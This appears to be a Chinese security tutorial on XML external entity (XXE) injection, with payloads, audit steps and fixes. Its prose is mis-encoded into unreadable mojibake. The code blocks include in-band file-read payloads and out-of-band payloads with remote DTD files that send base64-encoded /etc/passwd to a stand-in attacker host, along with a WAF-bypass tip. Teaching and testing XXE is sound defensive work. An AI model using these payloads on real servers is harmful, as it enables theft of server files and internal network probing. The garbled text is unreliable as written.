![](img/5efacfc93be64dbf29ec67aeac91fecd_1.png)

# ç¬¬59è¯¾ï¼šXMLä¸XXEå®‰å…¨è¯¦è§£ ğŸ›¡ï¸

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ XMLä¸XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰å®‰å…¨çš„ç›¸å…³çŸ¥è¯†ã€‚æˆ‘ä»¬å°†ä»XMLçš„åŸºæœ¬æ¦‚å¿µå…¥æ‰‹ï¼Œé€æ­¥æ·±å…¥åˆ°XXEæ¼æ´çš„åŸç†ã€åˆ©ç”¨æ–¹å¼ï¼ˆåŒ…æ‹¬æœ‰å›æ˜¾å’Œæ— å›æ˜¾æ”»å‡»ï¼‰ã€ä»¥åŠå¦‚ä½•åœ¨é»‘ç›’ä¸ç™½ç›’æµ‹è¯•ä¸­å‘ç°æ­¤ç±»æ¼æ´ã€‚è¯¾ç¨‹å†…å®¹åŠ›æ±‚ç®€å•ç›´ç™½ï¼Œè®©åˆå­¦è€…èƒ½å¤Ÿè½»æ¾ç†è§£ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_3.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_5.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_7.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_9.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_11.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_13.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_15.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_17.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_19.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_21.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_23.png)

## æ¦‚è¿° ğŸ“‹

![](img/5efacfc93be64dbf29ec67aeac91fecd_25.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_27.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_29.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_31.png)

XMLï¼ˆå¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼‰æ˜¯ä¸€ç§ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„æ ¼å¼è¯­è¨€ã€‚XXEï¼ˆXML External Entityï¼‰æ¼æ´ï¼Œä¹Ÿç§°ä¸ºXMLæ³¨å…¥ï¼Œå‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£ææ¶æ„æ„é€ çš„XMLè¾“å…¥æ—¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œç”šè‡³åœ¨æŸäº›æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ã€‚éšç€JSONæ ¼å¼çš„æ™®åŠï¼ŒXMLçš„ä½¿ç”¨æœ‰æ‰€å‡å°‘ï¼Œä½†å…¶å®‰å…¨é—®é¢˜ä¾ç„¶é‡è¦ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_33.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_35.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_37.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_39.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_41.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_43.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_45.png)

## XMLæ˜¯ä»€ä¹ˆï¼Ÿ ğŸ“„

![](img/5efacfc93be64dbf29ec67aeac91fecd_47.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_49.png)

XMLæ˜¯ä¸€ç§ç±»ä¼¼äºJSONçš„æ•°æ®ä¼ è¾“å’Œå­˜å‚¨æ ¼å¼ã€‚å®ƒçš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†ä»¥ç»“æ„åŒ–çš„æ–¹å¼ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚XMLæ–‡æ¡£ç”±æ ‡ç­¾å’Œå€¼ç»„æˆï¼Œç±»ä¼¼äºé”®å€¼å¯¹ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_51.png)

**ç¤ºä¾‹XMLç»“æ„ï¼š**
```xml
<user>
    <username>admin</username>
    <password>123456</password>
</user>
```

ä¸JSONç›¸æ¯”ï¼ŒXMLçš„ç»“æ„çœ‹èµ·æ¥æ›´å¤æ‚ï¼Œè¿™ä¹Ÿæ˜¯å…¶å¸‚åœºä»½é¢é€æ¸è¢«JSONå–ä»£çš„åŸå› ä¹‹ä¸€ã€‚ç„¶è€Œï¼Œè®¸å¤šé—ç•™ç³»ç»Ÿå’Œç‰¹å®šåœºæ™¯ä»åœ¨ä½¿ç”¨XMLã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_53.png)

---

## XXEæ¼æ´åŸç† âš™ï¸

![](img/5efacfc93be64dbf29ec67aeac91fecd_55.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_57.png)

XXEæ¼æ´çš„äº§ç”Ÿæºäºåº”ç”¨ç¨‹åºåœ¨è§£æXMLæ•°æ®æ—¶ï¼Œæœªå¯¹å¤–éƒ¨å®ä½“å¼•ç”¨è¿›è¡Œé€‚å½“é™åˆ¶ã€‚å½“æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¾“å…¥çš„XMLæ•°æ®ï¼Œå¹¶æ’å…¥æ¶æ„çš„å¤–éƒ¨å®ä½“å£°æ˜æ—¶ï¼Œå°±å¯èƒ½è§¦å‘æ¼æ´ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_59.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_61.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_63.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_65.png)

**æ¼æ´æ ¸å¿ƒæµç¨‹ï¼š**
1.  åº”ç”¨ç¨‹åºæ¥æ”¶XMLæ ¼å¼çš„è¾“å…¥æ•°æ®ã€‚
2.  ä½¿ç”¨XMLè§£æå™¨ï¼ˆå¦‚PHPçš„`simplexml_load_string`ã€Javaçš„`DocumentBuilder`ï¼‰å¤„ç†è¯¥æ•°æ®ã€‚
3.  å¦‚æœXMLæ•°æ®ä¸­åŒ…å«ç±»ä¼¼`<!ENTITY xxe SYSTEM "file:///etc/passwd">`çš„å£°æ˜ï¼Œè§£æå™¨å¯èƒ½ä¼šå°è¯•è¯»å–æŒ‡å®šæ–‡ä»¶ã€‚
4.  è‹¥è¯»å–çš„å†…å®¹è¢«åº”ç”¨ç¨‹åºè¾“å‡ºï¼ˆå›æ˜¾ï¼‰ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥ç›´æ¥çœ‹åˆ°æ–‡ä»¶å†…å®¹ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_67.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_69.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_71.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†XMLçš„åŸºæœ¬æ¦‚å¿µï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹XXEæ¼æ´æ˜¯å¦‚ä½•å…·ä½“äº§ç”Ÿçš„ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_73.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_75.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_77.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_79.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_81.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_83.png)

## æœ‰å›æ˜¾çš„XXEæ”»å‡» ğŸ¯

![](img/5efacfc93be64dbf29ec67aeac91fecd_85.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_87.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_89.png)

æœ‰å›æ˜¾æ”»å‡»æ˜¯æœ€ç›´æ¥çš„åˆ©ç”¨æ–¹å¼ã€‚å½“æœåŠ¡å™¨å°†XMLè§£æåçš„éƒ¨åˆ†å†…å®¹è¿”å›ç»™ç”¨æˆ·æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†æ–‡ä»¶è¯»å–çš„ç»“æœç›´æ¥æ˜¾ç¤ºåœ¨å“åº”ä¸­ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_91.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_93.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_95.png)

**æ”»å‡»Payloadç¤ºä¾‹ï¼š**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///d:/1.txt">
]>
<user>
    <username>&xxe;</username>
    <password>123</password>
</user>
```

ä¸Šè¿°Payloadå®šä¹‰äº†ä¸€ä¸ªåä¸º`xxe`çš„å¤–éƒ¨å®ä½“ï¼Œå…¶å†…å®¹ä¸º`d:/1.txt`æ–‡ä»¶ã€‚åœ¨`<username>`æ ‡ç­¾ä¸­å¼•ç”¨è¯¥å®ä½“`&xxe;`ï¼Œå½“æœåŠ¡å™¨è§£æXMLæ—¶ï¼Œå°±ä¼šç”¨æ–‡ä»¶å†…å®¹æ›¿æ¢è¯¥å®ä½“å¼•ç”¨ã€‚å¦‚æœ`<username>`çš„å€¼è¢«å›æ˜¾ï¼Œæ”»å‡»è€…å°±èƒ½çœ‹åˆ°æ–‡ä»¶å†…å®¹ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_97.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_99.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_101.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_103.png)

**é»‘ç›’æµ‹è¯•å…³æ³¨ç‚¹ï¼š**
*   **HTTPè¯·æ±‚å¤´ï¼š** è§‚å¯Ÿ`Content-Type`æ˜¯å¦ä¸º`application/xml`æˆ–`text/xml`ã€‚
*   **è¯·æ±‚ä½“æ ¼å¼ï¼š** è¯·æ±‚ä½“æ•°æ®æ˜¯å¦ä¸ºXMLç»“æ„ã€‚
*   æ»¡è¶³ä»¥ä¸Šä»»æ„ä¸€ç‚¹ï¼Œå³å¯å°è¯•æ³¨å…¥XXE Payloadè¿›è¡Œæµ‹è¯•ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_105.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_107.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_109.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_111.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_113.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_115.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_117.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_119.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_121.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_123.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_125.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_127.png)

## æ— å›æ˜¾çš„XXEæ”»å‡»ä¸OOBç›²æ³¨ ğŸ”

![](img/5efacfc93be64dbf29ec67aeac91fecd_129.png)

åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œå¾ˆå¤šæ¼æ´ç‚¹å¹¶æ²¡æœ‰ç›´æ¥çš„å›æ˜¾ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨â€œå¸¦å¤–â€ï¼ˆOut-Of-Band, OOBï¼‰æŠ€æœ¯æ¥æ£€æµ‹å’Œåˆ©ç”¨æ¼æ´ï¼Œä¹Ÿç§°ä¸ºXXEç›²æ³¨ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_131.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_133.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_135.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_137.png)

### 1. æ¼æ´å­˜åœ¨æ€§æ¢æµ‹

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚é€šè¿‡è®©æœåŠ¡å™¨è®¿é—®æˆ‘ä»¬æ§åˆ¶çš„è¿œç¨‹èµ„æºï¼Œæ ¹æ®æ˜¯å¦æœ‰è®¿é—®è®°å½•æ¥åˆ¤æ–­ã€‚

**æ¢æµ‹Payloadç¤ºä¾‹ï¼š**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % dtd SYSTEM "http://your-vps-ip/evil.dtd">
    %dtd;
]>
<user>
    <username>test</username>
    <password>test</password>
</user>
```

![](img/5efacfc93be64dbf29ec67aeac91fecd_139.png)

åœ¨è¿œç¨‹æœåŠ¡å™¨`your-vps-ip`ä¸Šæ”¾ç½®`evil.dtd`æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š
```dtd
<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://your-vps-ip/?data=%payload;'>">
%int;
%trick;
```
åŒæ—¶ï¼Œåœ¨æœåŠ¡å™¨ä¸Šå¼€å¯HTTPæœåŠ¡ï¼ˆå¦‚`python -m http.server 80`ï¼‰æˆ–ä½¿ç”¨DNSLOGç­‰å¹³å°æ¥æ”¶è¯·æ±‚ã€‚å¦‚æœæ”¶åˆ°æ¥è‡ªç›®æ ‡æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œåˆ™è¯æ˜å­˜åœ¨XXEæ¼æ´ä¸”å¯ä»¥å‘èµ·å¤–éƒ¨è¯·æ±‚ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_141.png)

### 2. æ— å›æ˜¾æ•°æ®å¤–å¸¦

![](img/5efacfc93be64dbf29ec67aeac91fecd_143.png)

ç¡®è®¤æ¼æ´å­˜åœ¨åï¼Œå¯ä»¥æ„é€ æ›´å¤æ‚çš„Payloadï¼Œå°†ç›®æ ‡æ–‡ä»¶çš„å†…å®¹é€šè¿‡HTTPè¯·æ±‚å‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_145.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_147.png)

**åˆ©ç”¨Payloadç¤ºä¾‹ï¼š**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % dtd SYSTEM "http://your-vps-ip/evil.dtd">
    %dtd;
]>
<user>
    <username>test</username>
    <password>test</password>
</user>
```

![](img/5efacfc93be64dbf29ec67aeac91fecd_149.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_151.png)

è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„`evil.dtd`æ–‡ä»¶å†…å®¹ï¼š
```dtd
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://your-vps-ip/?data=%file;'>">
%all;
```

![](img/5efacfc93be64dbf29ec67aeac91fecd_153.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_155.png)

è¿™æ ·ï¼Œ`/etc/passwd`æ–‡ä»¶ç»è¿‡Base64ç¼–ç åï¼Œä¼šä½œä¸ºURLå‚æ•°`data`çš„å€¼å‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œä»è€Œå®ç°æ— å›æ˜¾çš„æ–‡ä»¶è¯»å–ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_157.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_159.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_161.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_163.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_165.png)

## é»‘ç›’ä¸ç™½ç›’æ¼æ´æŒ–æ˜ ğŸ”

![](img/5efacfc93be64dbf29ec67aeac91fecd_167.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_169.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_171.png)

### é»‘ç›’æµ‹è¯•
ä¸»è¦ä¾èµ–äºå¯¹HTTPè¯·æ±‚çš„è§‚å¯Ÿå’Œåˆ†æã€‚
ä»¥ä¸‹æ˜¯é»‘ç›’æµ‹è¯•çš„å…³é”®æ­¥éª¤ï¼š
1.  **æ‹¦æˆªè¯·æ±‚ï¼š** ä½¿ç”¨Burp Suiteç­‰å·¥å…·æ‹¦æˆªåº”ç”¨ç¨‹åºçš„è¯·æ±‚ã€‚
2.  **è¯†åˆ«XMLï¼š** å¯»æ‰¾`Content-Type: application/xml`æˆ–è¯·æ±‚ä½“ä¸ºXMLæ ¼å¼çš„æ•°æ®åŒ…ã€‚
3.  **æ³¨å…¥æµ‹è¯•ï¼š** å°è¯•æ’å…¥ç®€å•çš„XXE Payloadï¼ˆå¦‚æœ‰å›æ˜¾çš„æ–‡ä»¶è¯»å–ï¼‰ï¼Œè§‚å¯Ÿå“åº”å˜åŒ–ã€‚
4.  **OOBæ¢æµ‹ï¼š** è‹¥æ— å›æ˜¾ï¼Œåˆ™ä½¿ç”¨OOB Payloadæ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_173.png)

### ç™½ç›’å®¡è®¡
åœ¨æ‹¥æœ‰æºä»£ç çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡æœç´¢å…³é”®å‡½æ•°æ¥å®šä½æ½œåœ¨çš„XXEæ¼æ´ç‚¹ã€‚

ä»¥ä¸‹æ˜¯ä¸åŒè¯­è¨€ä¸­éœ€è¦å…³æ³¨çš„XMLè§£æå‡½æ•°ï¼š
*   **PHPï¼š** `simplexml_load_string`, `DOMDocument::loadXML`, `xml_parse`
*   **Javaï¼š** `DocumentBuilder.parse`, `SAXParser.parse`, `XMLReader`
*   **Pythonï¼š** `xml.etree.ElementTree.parse`, `lxml.etree.parse`

![](img/5efacfc93be64dbf29ec67aeac91fecd_175.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_177.png)

**å®¡è®¡æ€è·¯ï¼š**
1.  åœ¨ä»£ç ä¸­å…¨å±€æœç´¢ä¸Šè¿°å‡½æ•°ã€‚
2.  å›æº¯å‡½æ•°çš„è¾“å…¥å‚æ•°ï¼Œæ£€æŸ¥æ˜¯å¦ç”±ç”¨æˆ·å¯æ§ï¼ˆå¦‚`$_POST`, `$_GET`ï¼‰ã€‚
3.  æ£€æŸ¥æ˜¯å¦é…ç½®äº†ç¦æ­¢è§£æå¤–éƒ¨å®ä½“ï¼ˆå¦‚PHPçš„`libxml_disable_entity_loader`ï¼ŒJavaçš„`setFeature(â€œhttp://apache.org/xml/features/disallow-doctype-declâ€, true)`ï¼‰ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_179.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_181.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_183.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_185.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•åˆ©ç”¨XXEæ¼æ´ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åœ¨ä¸åŒçš„æµ‹è¯•åœºæ™¯ä¸­å‘ç°å®ƒã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_187.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_189.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_191.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_192.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_194.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_195.png)

## å®æˆ˜æ¡ˆä¾‹ä¸æŠ€å·§ ğŸ› ï¸

![](img/5efacfc93be64dbf29ec67aeac91fecd_197.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_199.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_200.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_202.png)

### æ¡ˆä¾‹ï¼šæŸPHP CMS XXEæ¼æ´å®¡è®¡
1.  **å‡½æ•°å®šä½ï¼š** åœ¨æºç ä¸­æœç´¢`simplexml_load_string`ã€‚
2.  **å›æº¯è°ƒç”¨é“¾ï¼š** æ‰¾åˆ°ä½¿ç”¨è¯¥å‡½æ•°çš„ä»£ç å—ï¼Œå‘ç°å…¶å‚æ•°æ¥è‡ª`$GLOBALS[â€˜HTTP_RAW_POST_DATAâ€™]`ï¼ˆç”¨æˆ·å¯æ§çš„åŸå§‹POSTæ•°æ®ï¼‰ã€‚
3.  **æ„é€ è¯·æ±‚ï¼š** ç›´æ¥è®¿é—®è°ƒç”¨è¯¥å‡½æ•°çš„è„šæœ¬é¡µé¢ï¼Œå‘é€æ¶æ„çš„XMLæ•°æ®ã€‚
4.  **åˆ©ç”¨ï¼š** ç”±äºæ— å›æ˜¾ï¼Œé‡‡ç”¨OOBç›²æ³¨çš„æ–¹å¼æˆåŠŸè¯»å–æœåŠ¡å™¨æ–‡ä»¶ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_204.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_206.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_208.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_210.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_211.png)

### æŠ€å·§ä¸æ³¨æ„äº‹é¡¹
*   **åè®®åˆ©ç”¨ï¼š** é™¤äº†`file://`åè®®ï¼Œè¿˜å¯ä»¥å°è¯•`http://`ã€`ftp://`ã€`php://filter`ç­‰åè®®è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–å†…ç½‘æ¢æµ‹ã€‚
*   **ç©ºæ ¼å¤„ç†ï¼š** å¦‚æœæ–‡ä»¶è·¯å¾„åŒ…å«ç©ºæ ¼å¯¼è‡´è¯·æ±‚å¤±è´¥ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨PHPè¿‡æ»¤å™¨è¿›è¡ŒBase64ç¼–ç è¯»å–ã€‚
*   **WAFç»•è¿‡ï¼š** å°†æ¶æ„çš„DTDéƒ¨åˆ†æ”¾åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œæœ¬åœ°XMLåªè¿›è¡Œå¼•ç”¨ï¼Œæœ‰æ—¶å¯ä»¥ç»•è¿‡ä¸€äº›ç®€å•çš„è¿‡æ»¤è§„åˆ™ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_213.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_215.png)

---

## æ¼æ´ä¿®å¤å»ºè®® ğŸ›¡ï¸

![](img/5efacfc93be64dbf29ec67aeac91fecd_217.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_219.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_220.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_222.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_224.png)

ä¿®å¤XXEæ¼æ´çš„æ ¹æœ¬æ–¹æ³•æ˜¯ç¦ç”¨XMLè§£æå™¨å¯¹å¤–éƒ¨å®ä½“çš„è§£æèƒ½åŠ›ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_226.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_228.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_230.png)

ä»¥ä¸‹æ˜¯ä¿®å¤æ–¹æ¡ˆï¼š
*   **PHPï¼š** ä½¿ç”¨`libxml_disable_entity_loader(true);`å‡½æ•°ã€‚
*   **Javaï¼š**
    ```java
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature(â€œhttp://apache.org/xml/features/disallow-doctype-declâ€, true);
    dbf.setFeature(â€œhttp://xml.org/sax/features/external-general-entitiesâ€, false);
    dbf.setFeature(â€œhttp://xml.org/sax/features/external-parameter-entitiesâ€, false);
    ```
*   **Python (lxml)ï¼š** ä½¿ç”¨`resolve_entities=False`å‚æ•°ã€‚
*   **ä½¿ç”¨å®‰å…¨çš„æ›¿ä»£æ–¹æ¡ˆï¼š** å¦‚æœå¯èƒ½ï¼Œå°†æ•°æ®äº¤æ¢æ ¼å¼ä»XMLè¿ç§»åˆ°JSONï¼Œå¹¶é…åˆå®‰å…¨çš„è§£æå™¨ã€‚

![](img/5efacfc93be64dbf29ec67aeac91fecd_232.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_234.png)

---

![](img/5efacfc93be64dbf29ec67aeac91fecd_236.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_238.png)

## æ€»ç»“ ğŸ“

![](img/5efacfc93be64dbf29ec67aeac91fecd_239.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_241.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_242.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_243.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_245.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_247.png)

![](img/5efacfc93be64dbf29ec67aeac91fecd_249.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†XMLä¸XXEå®‰å…¨ã€‚
æˆ‘ä»¬ä»XMLçš„åŸºç¡€æ¦‚å¿µè®²èµ·ï¼Œæ˜ç™½äº†å®ƒæ˜¯ä¸€ç§æ•°æ®å­˜å‚¨å’Œä¼ è¾“æ ¼å¼ã€‚
éšåï¼Œæˆ‘ä»¬æ·±å…¥æ¢è®¨äº†XXEæ¼æ´çš„åŸç†ï¼Œå³æ¶æ„XMLå¤–éƒ¨å®ä½“è¢«è§£æå™¨æ‰§è¡Œã€‚
æˆ‘ä»¬è¯¦ç»†åˆ†æäº†æœ‰å›æ˜¾å’Œæ— å›æ˜¾ï¼ˆOOBç›²æ³¨ï¼‰ä¸¤ç§æ”»å‡»åœºæ™¯åŠå…¶åˆ©ç”¨æ–¹æ³•ã€‚
æœ€åï¼Œæˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•åœ¨é»‘ç›’æµ‹è¯•ä¸­é€šè¿‡è§‚å¯Ÿè¯·æ±‚ç‰¹å¾æ¥å‘ç°æ¼æ´ï¼Œä»¥åŠåœ¨ç™½ç›’å®¡è®¡ä¸­é€šè¿‡è¿½è¸ªXMLè§£æå‡½æ•°æ¥å®šä½æ¼æ´ï¼Œå¹¶ç»™å‡ºäº†ç›¸åº”çš„ä¿®å¤æ–¹æ¡ˆã€‚
ç†è§£XXEæ¼æ´çš„å…³é”®åœ¨äºæŠŠæ¡â€œç”¨æˆ·è¾“å…¥æ§åˆ¶XMLè§£æâ€è¿™ä¸€æ ¸å¿ƒï¼Œå¸Œæœ›æœ¬æ•™ç¨‹èƒ½å¸®åŠ©ä½ å»ºç«‹èµ·å¯¹XXEæ¼æ´çš„å…¨é¢è®¤è¯†ã€‚